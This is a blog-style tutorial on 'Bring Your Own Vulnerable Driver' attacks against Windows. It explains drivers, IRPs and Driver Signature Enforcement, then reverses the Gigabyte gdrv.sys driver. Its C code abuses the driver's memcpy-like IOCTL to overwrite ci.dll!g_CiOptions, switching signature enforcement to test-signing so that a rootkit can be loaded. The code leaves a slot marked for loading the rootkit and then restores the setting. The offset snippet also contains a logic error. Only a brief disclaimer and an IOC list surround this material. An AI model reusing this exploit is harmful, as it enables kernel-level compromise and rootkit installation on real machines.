---
title: "BYOVD: Bring Your Own Vulnerable Driver"
date: 2025-06-06 10:00:00 -0300
categories: [hacking,driver,kernel,windows]
tags: [malware,exploit,kernel]
---

## What is a driver?

A driver runs in kernel space, giving it a higher level of freedom—for example, Sysmon’s driver can terminate any process identified as malicious.

A driver runs in kernel mode to prevent security solutions from being bypassed by Admin or SYSTEM users.

## What can a driver do in a Red Team operation?

There are many reasons to leverage a driver exploit:
- Privilege escalation to SYSTEM
- Changing PP/PPL
- Modifying tokens
- Removing kernel callbacks
- Disabling ETW
- Bypassing DSE (if VBS is not enabled)
- ...

However, exploiting a driver isn’t that simple. Microsoft has implemented many restrictions to prevent driver exploits.

- **HVCI (Hypervisor-Protected Code Integrity)** is a security feature introduced in Windows 10 to validate drivers against the vulnerable-drivers blocklist.
- **VBS (Virtualization-based Security)** virtualizes hardware components to isolate the kernel (Secure Kernel).
- **KPP (Kernel Patch Guard)** monitors the kernel integrity; if corruption is detected, it triggers a **BugCheck**, causing a BSOD.
- A driver can only run with a valid signature after June 2015.

These restrictions exist because many APTs use drivers to compromise companies or wipe data.

## How does a driver work?

A driver uses the IRP (I/O Request Packet) structure to manage data within the driver.

Drivers always have a symbolic link to allow client applications to communicate with the driver.

Here is an example:

Client:
```c
// Client to driver via symbolic link \\.\w00tw00t
#define IOCTL_READ 0x8000
// ...
handle = CreateFile("\\.\\w00w00t");
DeviceIoControl(handle, IOCTL_READ, buffers, ...);
```

Driver:
```c
device = IoCreateDevice(...);
IoCreateSymbolicLink(device, symLinkName);
// ...
IRP_MJ_DEVICE_CONTROL = IRP_Handler;
// ...
IRP_Handler() {
    if (IOCTL == 0x8000) {
        //Read data
    }
}
```

A driver uses IOCTL codes to determine which function to execute.

In **ci.dll**, the variable **g_CiOptions** controls DSE (Driver Signature Enforcement).
DSE verifies whether a driver runs without a valid signature. Possible values:
- `0x6` (Enabled)
- `0x0` (Disabled)
- `0xE` (TestSigning mode)

## IRP Internals

[IRP (I/O Request Packets) Internals](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp) is a data structure used by the driver to handle I/O operations.

```c
//struct from https://learn.microsoft.com/pt-br/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp
typedef struct _IRP {
  CSHORT                    Type;
  USHORT                    Size;
  PMDL                      MdlAddress;
  ULONG                     Flags;
  union {
    struct _IRP     *MasterIrp;
    __volatile LONG IrpCount;
    PVOID           SystemBuffer;
  } AssociatedIrp;
  LIST_ENTRY                ThreadListEntry;
  IO_STATUS_BLOCK           IoStatus;
  KPROCESSOR_MODE           RequestorMode;
  BOOLEAN                   PendingReturned;
  CHAR                      StackCount;
  CHAR                      CurrentLocation;
  BOOLEAN                   Cancel;
  KIRQL                     CancelIrql;
  CCHAR                     ApcEnvironment;
  UCHAR                     AllocationFlags;
  union {
    PIO_STATUS_BLOCK UserIosb;
    PVOID            IoRingContext;
  };
  PKEVENT                   UserEvent;
  union {
    struct {
      union {
        PIO_APC_ROUTINE UserApcRoutine;
        PVOID           IssuingProcess;
      };
      union {
        PVOID                 UserApcContext;
#if ...
        _IORING_OBJECT        *IoRing;
#else
        struct _IORING_OBJECT *IoRing;
#endif
      };
    } AsynchronousParameters;
    LARGE_INTEGER AllocationSize;
  } Overlay;
  __volatile PDRIVER_CANCEL CancelRoutine;
  PVOID                     UserBuffer;
  union {
    struct {
      union {
        KDEVICE_QUEUE_ENTRY DeviceQueueEntry;
        struct {
          PVOID DriverContext[4];
        };
      };
      PETHREAD     Thread;
      PCHAR        AuxiliaryBuffer;
      struct {
        LIST_ENTRY ListEntry;
        union {
          struct _IO_STACK_LOCATION *CurrentStackLocation;
          ULONG                     PacketType;
        };
      };
      PFILE_OBJECT OriginalFileObject;
    } Overlay;
    KAPC  Apc;
    PVOID CompletionKey;
  } Tail;
} IRP;
```

**AssociatedIrp.SystemBuffer** points to a buffer controlled by the user for IOCTL calls.

**Tail.Overlay.CurrentStackLocation** points to structure IO_STACK_LOCATION which contains specific data about the I/O operations

**CurrentStackLocation.Parameters** Save received parameters from differ structures contanin MajorFunction values

**MajorFunction** is a member from DRIVER_OBJECT and can contain values like IRP_MJ_CREATE, IRP_MJ_READ, IRP_MJ_WRITE, IRP_MJ_DEVICE_CONTROL.

## Common vulnerabilities

Common driver vulnerabilities include:
- Arbitrary read/write primitives
- Stack/heap overflows
- Memory corruption

# Hands-on

First, choose the malware sample you want to reverse engineer. I use [LOLDrivers](https://www.loldrivers.io/) and decided to exploit `gdrv.sys` (Gigabyte driver).

The entry point is the `DriverEntry` export:

![DriverEntry export](/assets/byovd/driverentry.png)

Within `DriverEntry`, the DriverObject pointer is passed to a setup routine:

![Parsing DriverEntry](/assets/byovd/driverentryrev.png)

That routine creates the symbolic link and assigns the IRP_MJ_DEVICE_CONTROL handler:

![sub_13320](/assets/byovd/sub_13320.png)

IRP handlers inspect `CurrentStackLocation->Parameters` and dispatch based on the IOCTL code:

![IRP Handler](/assets/byovd/irphandler.png)

Into the function IRP_Handler its call CurrentStackLocation, MajorFunction, InputBuffer, OutputBuffer and IoControlCode

CurrentStackLocation is called to manage MajorFunction to se what MajorFunction client called, InputBuffer to see what buffer clients sends and OutputBuffer if have and Output from Driver.

IoControlCode to see what IOCTL is called to see what client calls to see what function will be executed

Going down you will see a switch to what IOCTL do you wanna to use

![IOCTL](/assets/byovd/ioctl1.png)

Into the switch he will compare to few IOCTL code and 0xC3502808 IOCTL Code has a memcpy-like function and vulnerable to exploit!

![Memcpy-like Function](/assets/byovd/memcpy.png)

Dst and Source is a SystemBuffer received with a length of 8 bytes because its is [QWORD](https://learn.microsoft.com/en-us/cpp/assembler/masm/qword?view=msvc-170) and Size is [DWORD](https://learn.microsoft.com/pt-br/cpp/assembler/masm/dword?view=msvc-170) so its have a lenth of 4 bytes, its enough to exploit and run our own rootkit.

## So, how exploit it ?

Its not so hard to develop a exploit if you understand the process.

We will change the value of DSE but we need to calculate the offset because in any update an kernel address will change

You can load PDB from the internet, similar do [EDRSandblast](https://raw.githubusercontent.com/wavestone-cdt/EDRSandblast/refs/heads/master/Offsets/ExtractOffsets.py) or calculate from yourself, using patterns or debbugger to

An example code:
```c
HMODULE CiHandle = LoadLibraryExA("ci.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
if(!CiHandle) {
  return -1;
}
PBYTE CiInitializeOffset = (PBYTE)GetProcAddress(CiHandle, "CiInitialize");
if(CiInitializeOffset == NULL) {
  ULONG64 Address = (ULONG64)(CiInitializeOffset - (PBYTE)CiHandle + baseAddressKernel);
  printf("DSE: %p\n",(Address+gCiOptionsOffset));
  return 0;
} else {
  return -1;
}
```
Its use ci.dll!CiInitialize because its nearest address to g_CiOptions of DSE

After calculate the offset, you need to communicate with a Driver, we already have a symbolic link and MajorFunction

```c
#define IOCTL_CODE 0xC3502808;
typedef struct _MemcpyLikeFunc {
	ULONG64 dest;
	ULONG64* src;
	DWORD size;
} MemcpyLikeFunc;
...
MemcpyLikeFunc gdrvStruct;
gdrvStruct.dest = gCiOptionsAddress; //ci.dll!g_CiOptions
gdrvStruct.size = 1; // 1 byte legnth
gdrvStruct.src = (ULONG64*)0xe; //TestSigning Mode 
HANDLE HandleDriver = CreateFile(L"\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
if(!HandleDriver) {
  return -1;
}
BYTE buff[0x30] = NULL;
DeviceIoControl(HandleDriver, IOCTL_CODE, (LPVOID)&gdrvStruct, sizeof(gdrvStruct), (LPVOID)buff, sizeof(buff), NULL, NULL);
... //rootkit load here
gdrvStruct.src = (ULONG64*)0x6; //Enable DSE to avoid KeBugCheck routine
DeviceIoControl(HandleDriver, IOCTL_CODE, (LPVOID)&gdrvStruct, sizeof(gdrvStruct), (LPVOID)buff, sizeof(buff), NULL, NULL);
CloseHandle(HandleDriver);
```
To check if DSE status you can use WinDBG attached to a kernel with with the following command:
```asm
kd> dt ci.dll!g_CiOptions L1
<AddressHere> 0xe
```

And the code to exploit is that, not a monstruosity code and avoids KeBugCheck

And there is how to exploit Driver and abuse that in Red Team Operation

It's only educational purpose i not responsible to any corrupted, BSOD or criminal actions!


# Indication of Compromisse (IOC)s

## MD5 hashes
- b0954711c133d284a171dd560c8f492a
- 043d5a1fc66662a3f91b8a9c027f9be9
- 3c55092900343d3d28564e2d34e7be2c
- 7907e14f9bcf3a4689c9a74a1a873cb6
- a72e10ecea2fdeb8b9d4f45d0294086b
- 31f34de4374a6ed0e70a022a0efa2570
- 4e093256b034925ecd6b29473ff16858
- 1549e6cbce408acaddeb4d24796f2eaf
- c832a4313ff082258240b61b88efa025
- d556cb79967e92b5cc69686d16c1d846

## SHA1 hashes
- 4f0d9122f57f4f8df41f3c3950359eb1284b9ab5
- 3d8cc9123be74b31c597b0014c2a72090f0c44ef
- 1a56614ea7d335c844b7fc6edd5feb59b8df7b55
- b9b72a5be3871ddc0446bae35548ea176c4ea613
- 4692730f6b56eeb0399460c72ade8a15ddd43a62
- c70989ed7a6ad9d7cd40ae970e90f3c3f2f84860
- eba5483bb47ec6ff51d91a9bdf1eee3b6344493d
- 18f09ec53f0b7d2b1ab64949157e0e84628d0f0a
- 1f1ce28c10453acbc9d3844b4604c59c0ab0ad46
- de2b56ef7a30a4697e9c4cdcae0fc215d45d061d

## Other
- Unknown binary running with anomalous behaviour;
- Unknown drivers running;
- Communicate to Microsoft and exeucting CreateFile and DeviceIoControl to \\.\GIO;
- Symlink \\.\GIO open.

